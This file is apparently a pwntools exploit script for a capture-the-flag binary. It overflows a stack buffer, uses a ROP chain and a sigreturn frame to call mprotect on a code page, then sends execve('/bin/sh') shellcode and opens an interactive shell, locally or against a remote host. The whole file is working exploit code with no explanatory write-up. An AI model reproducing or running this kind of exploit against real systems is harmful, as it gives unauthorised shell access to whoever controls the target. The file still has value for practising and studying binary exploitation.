from pwn import *
import sys

BINARY = "chall_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendline(content)

x, p = init()
x.debug((
    "break *vuln+32\nc\n"
))

buf_v13 = 80
padding = 8
fill = cyclic(buf_v13+padding)

r = ROP(exe)
read = exe.sym['vuln']
syscall_ret = r.find_gadget(['syscall','ret'])[0]
writable = 0x401000
new_ret = 0x4010f0 # Program Entrypoint

r.call(read)
r.raw(syscall_ret)

pay = fill
pay += flat(r)

frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = writable
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = new_ret
frame.rip = syscall_ret

pay += flat(frame)

log.info(f"{len(pay)=:x}")

x.send(pay)

pay = b'A'*(0xf-1) # sigret

x.send(pay)

# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = b""
shellcode += b"\x31\xc0\x48\xbb\xd1\x9d\x96"
shellcode += b"\x91\xd0\x8c\x97\xff\x48\xf7"
shellcode += b"\xdb\x53\x54\x5f\x99\x52\x57"
shellcode += b"\x54\x5e\xb0\x3b\x0f\x05"

payload = fill
payload += p64(new_ret+8)
payload += shellcode

sleep(2)
p.sendline(payload)
p.interactive()